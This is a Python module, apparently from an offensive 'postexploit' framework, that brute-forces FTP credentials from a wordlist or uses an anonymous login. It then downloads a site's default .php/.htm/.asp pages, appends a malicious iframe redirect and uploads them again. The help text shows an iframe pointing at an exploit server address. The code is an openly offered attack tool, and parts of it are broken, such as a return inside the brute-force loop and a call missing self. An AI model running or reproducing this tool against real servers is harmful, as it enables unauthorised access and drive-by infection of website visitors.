MODULE_TYPE = "postexploit"
import zipfile
import ftplib
import time
from threading import Thread
from collections import OrderedDict
# Module class definition
class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'Ftp Password Bruter pro',
            'Rank':'Good',
            'Platform':'Windows/Linux/Macos',
            'architectures':'x86/64 bit processors',
            'Description': 'Bruteforces ftp Services passwords given a wordlistFile',
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Options': OrderedDict([
                ('RHOST', ('', True, 'FTP SERVER IP')),
                ('REDIRECT', ('', False, 'YES/NO')),
                ('URL', ('', False, 'redirect page if any.')),
                ('WORDLIST', ('/usr/share/wordlists/rockyou.txt', True, 'Wordlist path'))
                ])
                }
    def help(self):
        print("Usage: set RHOST 192.168.95.179 | set URL <iframe src=http://10.10.10.112:8080/exploit></iframe> | set WORDLIST <path/to/file> then run")    	    
    def anonLogin(self,rhost):
    	try:
    		ftp = ftplib.FTP(rhost)
    		ftp.login('anonymous', 'password')
    		print ('\n[*] ' + str(rhost)+ ' FTP Anonymous Logon Succeeded.')
    		ftp.quit()
    		return True
    	except Exception as e:
    		print(e)
    		print ('\n[-] ' + str(rhost) +' FTP Anonymous Logon Failed.')
    	return False
    def bruteLogin(self,rhost, wordlist):
    	pF = open(wordlist)#, 'r')
    	for line in pF.readlines():
    		time.sleep(1)
    		userName = line.split(':')[0]
    		passWord = line.split(':')[1].strip('\r').strip('\n')
    		print ('[+] Trying: ' + userName + '/' + passWord)
    		try:
    			ftp = ftplib.FTP(rhost)
    			ftp.login(userName, passWord)
    			print ('\n[*] ' + str(rhost) +' FTP Logon Succeeded: '+userName+'/'+passWord)
    			ftp.quit()
    			return (userName, passWord)
    		except Exception as e:
    			print(e)
    			pass
    		print ('\n[-] Could not brute force FTP credentials.')
    		return (None, None)
    def returnDefault(self,ftp):
    	try:
    		dirList = ftp.nlst()
    	except:
    		dirList = []
    		print ('[-] Could not list directory contents.')
    		print ('[-] Skipping To Next Target.')
    		return
    	retList = []
    	for fileName in dirList:
    		fn = fileName.lower()
    		if '.php' in fn or '.htm' in fn or '.asp' in fn:
    			print ('[+] Found default page: ' + fileName)
    			retList.append(fileName)
    	return retList
    def injectPage(self,ftp, page, redirect):
    	f = open(page + '.tmp', 'w')
    	ftp.retrlines('RETR ' + page, f.write)
    	print ('[+] Downloaded Page: ' + page)
    	f.write(redirect)
    	f.close()
    	print ('[+] Injected Malicious IFrame on: ' + page)
    	ftp.storlines('STOR ' + page, open(page + '.tmp'))
    	print ('[+] Uploaded Injected Page: ' + page)

    def attack(self,username, password, rhost, redirect):
    	ftp = ftplib.FTP(rhost)
    	ftp.login(username, password)
    	defPages = returnDefault(ftp)
    	for defPage in defPages:
    		self.injectPage(ftp, defPage, redirect)
    def execute(self):
        rhost = self.info['Options']['RHOST'][0]
        wordlist = self.info['Options']['WORDLIST'][0]
        url = self.info['Options']['URL'][0]
        redirect = self.info['Options']['REDIRECT'][0]
        if rhost == None or redirect == None:
        	self.help()
        	return
        username = None
        password = None
        if self.anonLogin(rhost) == True:
        		username = 'anonymous'
        		password = 'password'
        		print ('[+] Using Anonymous Creds to attack')
        		self.attack(username, password, rhost, redirect)
        elif wordlist != None:
        			(username, password) =\
   self.bruteLogin(rhost, wordlist)
        			#username, password = self.bruteLogin(host, wordlist)
        			if password != None:
        				print('[+] Using Creds: ' + username + '/' + password + ' to attack')
        				self.attack(username, password, rhost, redirect)
        
        return "[+] Bruteforcing ftp password ..."
    